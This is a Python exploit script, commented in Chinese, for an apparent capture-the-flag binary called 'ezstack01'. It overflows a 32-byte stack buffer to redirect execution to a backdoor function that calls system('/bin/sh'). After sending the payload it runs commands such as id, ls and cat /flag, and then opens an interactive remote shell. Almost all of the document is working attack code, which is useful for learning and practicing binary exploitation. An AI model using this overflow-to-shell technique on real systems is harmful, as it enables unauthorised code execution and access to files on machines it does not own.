#!/usr/bin/env python3
# ezstack01 (2024jzbai3v301) — 栈溢出直跳后门
# 漏洞: vuln@0x40123e  read(0, rbp-0x20, 0x30) 读48字节进32字节buf,
#       覆盖 saved rbp(off32) + 返回地址(off40)。无PIE/无canary。
# 后门: 0x4011d6 函数 lea rdi,"/bin/sh"(0x402004); call system。
#       跳 0x4011de(跳过 endbr64/push rbp) 以保证 system 栈对齐。
# num(scanf %d -> .bss 0x40406c) 读而不用, 任意值即可。
import socket, struct, sys, time

p64 = lambda x: struct.pack('<Q', x)
BACKDOOR = 0x4011de   # lea rdi,/bin/sh; call system (对齐入口)

def pwn(host, port):
    s = socket.create_connection((host, port), timeout=15)
    s.settimeout(6)
    buf = b""
    def fill(t=1.0):
        nonlocal buf
        end = time.time()+t
        while time.time() < end:
            try:
                s.settimeout(max(0.05, end-time.time())); d = s.recv(65536)
            except socket.timeout: break
            if not d: break
            buf += d
    def until(m, t=6):
        nonlocal buf
        end = time.time()+t
        while m not in buf:
            try:
                s.settimeout(max(0.05, end-time.time())); d = s.recv(65536)
            except socket.timeout:
                if time.time() > end: raise TimeoutError(repr(buf[-120:]))
                continue
            if not d: raise EOFError(repr(buf[-120:]))
            buf += d
        i = buf.index(m)+len(m); out, buf = buf[:i], buf[i:]; return out
    def run(cmd, t=0.8):
        nonlocal buf
        s.sendall(cmd.encode()+b"\n"); time.sleep(t); fill(0.5)
        out, buf = buf, b""
        return out.decode(errors="replace")

    payload = b"A"*40 + p64(BACKDOOR)
    until(b"pass num:")
    s.sendall(b"1\n"); until(b"pass buffer:")
    s.sendall(payload + b"\n")
    time.sleep(0.5); fill(0.5)
    print(run("echo PWNED", 0.5))
    print(run("export PATH=/bin:/usr/bin:/sbin:/usr/sbin", 0.3))
    print(run("id; ls -la /", 0.8))
    # 读 flag: 先试常见路径, 再用 shell 内建(精简环境可能无 cat)
    print(run("cat /flag /flag.txt 2>&1", 0.6))
    print(run('while IFS= read -r l || [ -n "$l" ]; do echo "$l"; done < /flag', 0.6))
    print("[+] 交互 (Ctrl-C 退出)")
    try:
        while True:
            cmd = input("$ ")
            print(run(cmd, 0.5))
    except (EOFError, KeyboardInterrupt):
        pass
    s.close()

if __name__ == "__main__":
    host = sys.argv[1]
    port = int(sys.argv[2])
    pwn(host, port)